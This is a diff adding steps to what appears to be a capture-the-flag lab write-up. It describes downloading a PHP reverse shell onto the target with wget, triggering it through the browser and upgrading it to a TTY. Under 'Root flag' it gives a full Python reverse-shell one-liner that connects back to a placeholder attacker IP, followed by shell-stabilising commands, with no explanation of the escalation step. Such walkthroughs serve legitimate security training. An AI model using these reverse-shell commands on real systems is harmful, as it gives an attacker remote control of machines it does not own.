@@ -100,12 +100,34 @@ That does not works. So let's try to set up a webserver on local and execute a w
 $ python3 -m http.server 80
 ```
 
+Take this follow commands to get the reverse shell file from target to our webserver.
+
+```bash
+cmd:wget http://<your_ip>/<reverse_shell_file>
+```
+
+Then, we can execute the file on the browser with this url : http://<target_ip>/<php-reverse-shell>
+
+We can upgrade our reverse shell to a pseudo operationnel TTY :
+
+```bash
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ubuntu:/$  
+``` 
+ 
+---  
+  
 ## User flag
 
-
+The user flag is in /home/www-data/flag.txt
 
 ---
 
 ## Root flag
 
-
+  
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<listner_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
+python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo;fg
